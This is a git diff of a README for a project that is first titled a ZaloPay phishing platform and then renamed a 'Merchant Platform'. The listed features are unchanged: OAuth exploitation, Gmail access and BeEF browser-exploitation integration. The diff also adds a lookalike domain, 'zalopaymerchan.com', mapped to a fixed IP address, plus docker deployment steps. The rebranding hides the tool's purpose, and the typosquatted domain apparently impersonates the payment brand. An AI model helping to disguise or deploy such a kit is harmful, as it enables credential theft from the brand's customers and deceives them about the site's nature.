@@ -1,6 +1,43 @@
-# ZaloPay Phishing Platform
+# ZaloPay Merchant Platform
 
-A comprehensive phishing platform designed for educational and research purposes, featuring advanced OAuth exploitation, Gmail access, BeEF integration, and real-time monitoring.
+A comprehensive platform designed for educational and research purposes, featuring advanced OAuth exploitation, Gmail access, BeEF integration, real-time monitoring, and intelligent routing between merchant and admin interfaces.
+
+## 🆕 Latest Updates (2025-10-21)
+
+**NEW: Smart Routing Architecture Implemented!**
+
+We've implemented a complete routing architecture that automatically separates merchant (customer-facing) and admin (management) interfaces while running on the same domain.
+
+### Quick Links to New Documentation
+
+- 📖 **[QUICKSTART.md](QUICKSTART.md)** - Get started in 5 minutes
+- 🚀 **[DEPLOYMENT_GUIDE.md](DEPLOYMENT_GUIDE.md)** - Complete deployment instructions
+- 🏗️ **[ROUTING_ARCHITECTURE.md](ROUTING_ARCHITECTURE.md)** - Routing system details
+- 📊 **[IMPLEMENTATION_SUMMARY.md](IMPLEMENTATION_SUMMARY.md)** - Implementation overview
+- 🎨 **[VISUAL_GUIDE.md](VISUAL_GUIDE.md)** - Visual guide with diagrams
+
+### Key Features Added
+
+✅ **Smart Router** - Automatic role detection and routing  
+✅ **Domain Configuration** - zalopaymerchan.com → 221.120.163.129  
+✅ **Interface Separation** - Clear merchant/admin separation  
+✅ **Automation Scripts** - Setup, testing, and deployment tools  
+✅ **Comprehensive Documentation** - 6 detailed guides  
+
+### Quick Start
+
+```bash
+# Setup environment
+./scripts/setup_env.sh
+
+# Deploy
+docker compose build && docker compose up -d
+
+# Test
+./scripts/test_routing.sh
+```
+
+Visit: **http://zalopaymerchan.com/** to see the new router in action!
 
 ## 🚀 Features
 
